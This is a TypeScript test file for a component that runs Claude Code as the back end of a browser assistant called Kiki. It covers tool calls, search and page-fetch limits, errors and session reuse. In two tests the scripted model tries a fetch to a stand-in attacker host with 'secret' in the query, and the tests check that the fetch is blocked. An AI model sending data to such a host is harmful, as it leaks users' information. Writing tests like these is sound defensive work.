import type Anthropic from "@anthropic-ai/sdk";
import type { KikiEvent, ToolResult } from "@kiki/shared";
import { afterEach, describe, expect, it } from "vitest";
import { DEFAULT_CLAUDE_CONFIG } from "../src/claude.ts";
import { ClaudeCodeProcess, runClaudeCodeTurn, type TakeSpare } from "../src/claudeCode.ts";
import { PlanError } from "../src/accounts.ts";
import { SYSTEM_PROMPT } from "../src/prompt.ts";
import { OUT_OF_TOOL_ROUNDS, type TurnOptions } from "../src/turn.ts";
import { fakeClaudeCode, type FakeClaudeQuery } from "./helpers.ts";

const QUESTION: Anthropic.Beta.BetaMessageParam = {
  role: "user",
  content: [{ type: "text", text: "<page_url>\nhttps://example.com/page\n</page_url>\n\n<question>\nWhat is this?\n</question>" }],
};

const SCREENSHOT = { mediaType: "image/png" as const, data: "iVBORw0KGgo=" };

async function run(
  queries: FakeClaudeQuery[] | ReturnType<typeof fakeClaudeCode>,
  options: Partial<TurnOptions> & { takeSpare?: TakeSpare } = {},
) {
  const fake = Array.isArray(queries) ? fakeClaudeCode(queries) : queries;
  const events: KikiEvent[] = [];
  const tools: Array<{ name: string; input: Record<string, unknown> }> = [];
  const result = await runClaudeCodeTurn({
    query: fake.query,
    executable: "/home/me/.local/bin/claude",
    config: DEFAULT_CLAUDE_CONFIG,
    history: [QUESTION],
    emit: (event) => events.push(event),
    model: "claude-opus-5-5",
    callTool: async (id, name, input): Promise<ToolResult> => {
      tools.push({ name, input });
      return name === "scroll" ? { id, content: "Scrolled down.", screen: { text: "More text.", screenshot: SCREENSHOT } } : { id, content: "Opened." };
    },
    ...options,
  });
  return { result, events, tools, ...fake };
}

const text = (events: KikiEvent[], type: "text" | "thinking") =>
  events.flatMap((e) => (e.type === type ? [e.delta] : [])).join("");

const savedKey = process.env.ANTHROPIC_API_KEY;
afterEach(() => {
  if (savedKey === undefined) delete process.env.ANTHROPIC_API_KEY;
  else process.env.ANTHROPIC_API_KEY = savedKey;
});

describe("runClaudeCodeTurn", () => {
  it("runs Claude Code with Kiki's prompt and tools only, without the API key, and streams the answer", async () => {
    process.env.ANTHROPIC_API_KEY = "sk-ant-elsewhere";
    const { result, events, calls } = await run(
      [{ responses: [{ blocks: [{ type: "thinking", thinking: "Reading the page." }, { type: "text", text: "It's a page." }] }] }],
      { effort: "medium", tools: { open: true } },
    );
    expect(text(events, "thinking")).toBe("Reading the page.");
    expect(text(events, "text")).toBe("It's a page.");
    expect(result).toMatchObject({
      kind: "answered",
      stopReason: "end_turn",
      messages: [{ role: "assistant", content: [{ type: "text", text: "It's a page." }] }],
      usage: { inputTokens: 100, outputTokens: 50, cacheReadTokens: 40, cacheWriteTokens: 10 },
      agent: { provider: "anthropic", id: "session-1" },
    });

    const { options, message } = calls[0]!;
    expect(message).toEqual(QUESTION);
    expect(options).toMatchObject({
      model: "claude-opus-5-5",
      effort: "medium",
      thinking: { type: "adaptive", display: "summarized" },
      tools: ["WebSearch", "WebFetch"],
      permissionMode: "dontAsk",
      settingSources: [],
      strictMcpConfig: true,
      includePartialMessages: true,
    });
    expect(options.systemPrompt).toMatch(new RegExp(`^${SYSTEM_PROMPT.slice(0, 40)}`));
    expect(options.systemPrompt).toContain("mcp__kiki__");
    expect(options.resume).toBeUndefined();
    // Their own Claude Code, signed in with their plan: never the bundled one, never an API key.
    expect(options.pathToClaudeCodeExecutable).toBe("/home/me/.local/bin/claude");
    expect(options.env?.["ANTHROPIC_API_KEY"]).toBeUndefined();
    expect(options.env?.["PATH"]).toBe(process.env.PATH);
  });

  it("answers when the person's Claude Code is signed in with an API key: that's their account too", async () => {
    const { result } = await run([{ apiKeySource: "/login managed key", responses: [{ blocks: [{ type: "text", text: "Hi." }] }] }]);
    expect(result.kind).toBe("answered");
  });

  it("says when Kiki can't start their Claude Code", async () => {
    const query = () =>
      (async function* () {
        throw new Error("Claude Code executable not found at /gone/claude. Is options.pathToClaudeCodeExecutable set?");
      })();
    const error = await runClaudeCodeTurn({
      query,
      executable: "/gone/claude",
      config: DEFAULT_CLAUDE_CONFIG,
      history: [QUESTION],
      emit: () => {},
      model: "claude-opus-5-5",
    }).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(PlanError);
    expect(error).toMatchObject({ code: "upstream", message: expect.stringContaining("couldn't start Claude Code") });
  });

  it("doesn't start Claude Code for a question cancelled before it began", async () => {
    const controller = new AbortController();
    controller.abort();
    // No query is scripted: starting one would fail with another error.
    await expect(run([], { signal: controller.signal })).rejects.toThrow("Request cancelled.");
  });

  it("runs Kiki's tools through Claude Code, with notes before the call and the results in the history", async () => {
    const { result, events, tools, toolOutputs } = await run(
      [
        {
          responses: [
            {
              blocks: [
                { type: "text", text: "Let me open it." },
                { type: "tool_use", name: "mcp__kiki__open_search", input: { where: "images", query: "cute puppies" } },
              ],
              stopReason: "tool_use",
            },
            { blocks: [{ type: "text", text: "I opened it." }] },
          ],
        },
      ],
      { tools: { open: true } },
    );
    expect(tools).toEqual([{ name: "open_search", input: { where: "images", query: "cute puppies" } }]);
    expect(events).toContainEqual({ type: "notes", chars: "Let me open it.".length });
    expect(events).toContainEqual({ type: "tool_call", id: "toolu_1", name: "open_search", input: { where: "images", query: "cute puppies" } });
    expect(toolOutputs).toEqual([{ content: [{ type: "text", text: "Opened." }] }]);
    expect(result).toMatchObject({
      kind: "answered",
      messages: [
        {
          role: "assistant",
          content: [
            { type: "text", text: "Let me open it." },
            { type: "tool_use", id: "toolu_1", name: "open_search", input: { where: "images", query: "cute puppies" } },
          ],
        },
        { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_1", content: "Opened." }] },
        { role: "assistant", content: [{ type: "text", text: "I opened it." }] },
      ],
    });
  });

  it("gives Claude Code a scroll's screenshot as an image", async () => {
    const { toolOutputs } = await run(
      [
        {
          responses: [
            { blocks: [{ type: "tool_use", name: "mcp__kiki__scroll", input: { direction: "down" } }], stopReason: "tool_use" },
            { blocks: [{ type: "text", text: "Below is more text." }] },
          ],
        },
      ],
      { tools: { screen: true } },
    );
    expect(toolOutputs[0]!.content).toEqual([
      { type: "image", data: SCREENSHOT.data, mimeType: "image/png" },
      expect.objectContaining({ type: "text", text: expect.stringContaining("More text.") }),
    ]);
  });

  it("refuses card and lookup tools past the answer's rounds", async () => {
    const call = (round: number) => ({
      blocks: [{ type: "tool_use" as const, name: "mcp__kiki__open_search", input: { where: "web", query: `q${round}` } }],
      stopReason: "tool_use",
    });
    const { tools, toolOutputs } = await run(
      [{ responses: [call(1), call(2), call(3), call(4), call(5), { blocks: [{ type: "text", text: "Done." }] }] }],
      { tools: { open: true } },
    );
    expect(tools).toHaveLength(4);
    expect(toolOutputs.at(-1)).toEqual({ content: [{ type: "text", text: OUT_OF_TOOL_ROUNDS }], isError: true });
  });

  it("reports web searches and their results as sources, and reads only pages it found or saw", async () => {
    const { result, events, gate } = await run([
      {
        responses: [
          {
            blocks: [{ type: "tool_use", name: "WebSearch", input: { query: "kiki release" } }],
            searchResults: [{ url: "https://example.com/release", title: "Release" }],
            stopReason: "tool_use",
          },
          {
            blocks: [
              { type: "tool_use", name: "WebFetch", input: { url: "https://example.com/release", prompt: "Version?" } },
              { type: "tool_use", name: "WebFetch", input: { url: "http://example.com/page/", prompt: "What?" } },
              { type: "tool_use", name: "WebFetch", input: { url: "https://attacker.example/?q=secret", prompt: "Hi" } },
            ],
            stopReason: "tool_use",
          },
          { blocks: [{ type: "text", text: "Version 2." }] },
        ],
      },
    ]);
    expect(events).toContainEqual({ type: "status", phase: "searching", query: "kiki release" });
    expect(events).toContainEqual({ type: "activity", activity: { kind: "search", query: "kiki release" } });
    expect(events).toContainEqual({
      type: "activity",
      activity: { kind: "results", sources: [{ url: "https://example.com/release", title: "Release" }] },
    });
    expect(events).toContainEqual({ type: "activity", activity: { kind: "read", url: "https://example.com/release" } });
    expect(gate).toEqual([
      { tool: "WebSearch", allowed: true },
      { tool: "WebFetch", allowed: true },
      { tool: "WebFetch", allowed: true },
      { tool: "WebFetch", allowed: false, reason: expect.stringContaining("all the page reading") },
    ]);
    // Pages it read count as sources too.
    expect(result).toMatchObject({
      kind: "answered",
      sources: [
        { url: "https://example.com/release", title: "Release" },
        { url: "http://example.com/page/", title: "http://example.com/page/" },
      ],
    });
    // Claude Code's own tools stay out of the history.
    expect(result.kind === "answered" && result.messages).toEqual([{ role: "assistant", content: [{ type: "text", text: "Version 2." }] }]);
  });

  it("doesn't read pages Claude hasn't seen, and stops searching at the limit", async () => {
    const search = (query: string) => ({ type: "tool_use" as const, name: "WebSearch", input: { query } });
    const { gate } = await run([
      {
        responses: [
          { blocks: [{ type: "tool_use", name: "WebFetch", input: { url: "https://attacker.example/?q=secret", prompt: "Hi" } }], stopReason: "tool_use" },
          { blocks: [search("a"), search("b"), search("c"), search("d")], stopReason: "tool_use" },
          { blocks: [{ type: "text", text: "Done." }] },
        ],
      },
    ]);
    expect(gate.map((g) => g.allowed)).toEqual([false, true, true, true, false]);
    expect(gate[0]!.reason).toContain("search results or from the conversation");
  });

  it("reports refusals", async () => {
    const { result } = await run([{ responses: [{ blocks: [{ type: "text", text: "" }], stopReason: "refusal" }] }]);
    expect(result.kind).toBe("refused");
  });

  it("says when the plan's limit is used up, and when it resets", async () => {
    const resetsAt = Math.floor(Date.now() / 1000) + 3600;
    const error = await run([
      { error: "rate_limit", rateLimit: { status: "rejected", resetsAt, rateLimitType: "five_hour" }, responses: [] },
    ]).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(PlanError);
    expect(error).toMatchObject({ code: "limit", message: expect.stringMatching(/Claude plan's limit for now \(it resets at .+\)\.$/) });
  });

  it("says when Claude Code isn't signed in", async () => {
    const error = await run([{ error: "authentication_failed", responses: [] }]).catch((e: unknown) => e);
    expect(error).toMatchObject({ code: "unauthorized", message: expect.stringContaining("Run `claude` in a terminal") });
  });

  it("resumes the conversation's session with just the new question", async () => {
    const followUp: Anthropic.Beta.BetaMessageParam = { role: "user", content: [{ type: "text", text: "And then?" }] };
    const history = [QUESTION, { role: "assistant" as const, content: [{ type: "text" as const, text: "It's a page." }] }, followUp];
    const first = await run([{ responses: [{ blocks: [{ type: "text", text: "It's a page." }] }] }]);
    const key = first.result.kind === "answered" ? first.result.agent!.key : "";
    const { calls, result } = await run([{ responses: [{ blocks: [{ type: "text", text: "Then more." }] }] }], {
      history,
      agent: { provider: "anthropic", id: "session-old", key },
    });
    expect(calls[0]!.options.resume).toBe("session-old");
    expect(calls[0]!.message).toEqual(followUp);
    expect(result).toMatchObject({ agent: { id: "session-old", key } });
  });

  it("starts a new session with the earlier turns when it can't resume one", async () => {
    const history: Anthropic.Beta.BetaMessageParam[] = [
      QUESTION,
      { role: "assistant", content: [{ type: "text", text: "It's a page." }] },
      { role: "user", content: [{ type: "text", text: "And then?" }] },
    ];
    const { calls } = await run([{ responses: [{ blocks: [{ type: "text", text: "Then more." }] }] }], {
      history,
      // A session from another provider (or another system prompt) can't be continued.
      agent: { provider: "openai", id: "thread-1", key: "other" },
    });
    expect(calls[0]!.options.resume).toBeUndefined();
    const content = calls[0]!.message.content as Array<{ type: string; text?: string }>;
    expect(content).toHaveLength(1);
    expect(content[0]!.text).toMatch(/^<earlier_turns>\nThe conversation so far:\n\nPerson: <page_url>[\s\S]*\n\nYou: It's a page\.\n<\/earlier_turns>\n\nAnd then\?$/);
  });
});

describe("a Claude Code process started ahead of its question", () => {
  const SETUP = { config: DEFAULT_CLAUDE_CONFIG, model: "claude-opus-5-5", executable: "/home/me/.local/bin/claude" };
  const search = (query: string) => ({ type: "tool_use" as const, name: "WebSearch", input: { query } });

  it("serves the turn it was started for: that turn's tools, web limits and conversation", async () => {
    const fake = fakeClaudeCode([
      {
        responses: [
          { blocks: [{ type: "tool_use", name: "mcp__kiki__open_search", input: { where: "web", query: "kiki" } }], stopReason: "tool_use" },
          // The page is in the question, which the process only has once the turn begins.
          { blocks: [{ type: "tool_use", name: "WebFetch", input: { url: "https://example.com/page", prompt: "What?" } }], stopReason: "tool_use" },
          { blocks: [search("a"), search("b"), search("c"), search("d")], stopReason: "tool_use" },
          { blocks: [{ type: "text", text: "Done." }] },
        ],
      },
    ]);
    const spare = new ClaudeCodeProcess({ ...SETUP, tools: { open: true } });
    await spare.warm(fake.startup);
    expect(fake.starts).toHaveLength(1);
    const asked: string[] = [];
    const takeSpare: TakeSpare = (fingerprint) => {
      asked.push(fingerprint);
      return fingerprint === spare.fingerprint ? spare : undefined;
    };
    const { result, tools, calls, gate } = await run(fake, { tools: { open: true }, takeSpare });
    expect(asked).toEqual([spare.fingerprint]);
    expect(calls[0]!.warm).toBe(true);
    expect(calls[0]!.options).toBe(fake.starts[0]!.options);
    expect(tools).toEqual([{ name: "open_search", input: { where: "web", query: "kiki" } }]);
    expect(gate.map((g) => g.allowed)).toEqual([true, true, true, true, false]);
    expect(result).toMatchObject({ kind: "answered", agent: { id: "session-1" } });
    expect(fake.starts[0]!.closed).toBe(false);
  });

  it("isn't used by a turn that needs something else, which starts its own", async () => {
    const fake = fakeClaudeCode([{ responses: [{ blocks: [{ type: "text", text: "Hi." }] }] }]);
    const spare = new ClaudeCodeProcess({ ...SETUP, tools: { open: true } });
    await spare.warm(fake.startup);
    const asked: string[] = [];
    const takeSpare: TakeSpare = (fingerprint) => {
      asked.push(fingerprint);
      return undefined;
    };
    const { result, calls } = await run(fake, { tools: { screen: true }, takeSpare });
    expect(asked).toHaveLength(1);
    expect(asked[0]).not.toBe(spare.fingerprint);
    expect(calls[0]!.warm).toBe(false);
    expect(calls[0]!.options).not.toBe(spare.options);
    expect(result.kind).toBe("answered");
  });

  it("has a fingerprint of what the question needs: prompt, tools, model, effort, session and Claude Code", () => {
    const base = new ClaudeCodeProcess(SETUP);
    expect(new ClaudeCodeProcess(SETUP).fingerprint).toBe(base.fingerprint);
    const others = [
      { model: "claude-haiku-5-5" },
      { effort: "high" as const },
      { tools: { open: true } },
      { personality: "Terse." },
      { agent: { provider: "anthropic" as const, id: "session-old", key: base.key } },
      { executable: "/opt/homebrew/bin/claude" },
    ];
    for (const other of others) expect(new ClaudeCodeProcess({ ...SETUP, ...other }).fingerprint).not.toBe(base.fingerprint);
    // A session it can't continue (another provider's, or another prompt's) doesn't count.
    expect(new ClaudeCodeProcess({ ...SETUP, agent: { provider: "openai", id: "thread-1", key: "other" } }).fingerprint).toBe(base.fingerprint);
  });
});
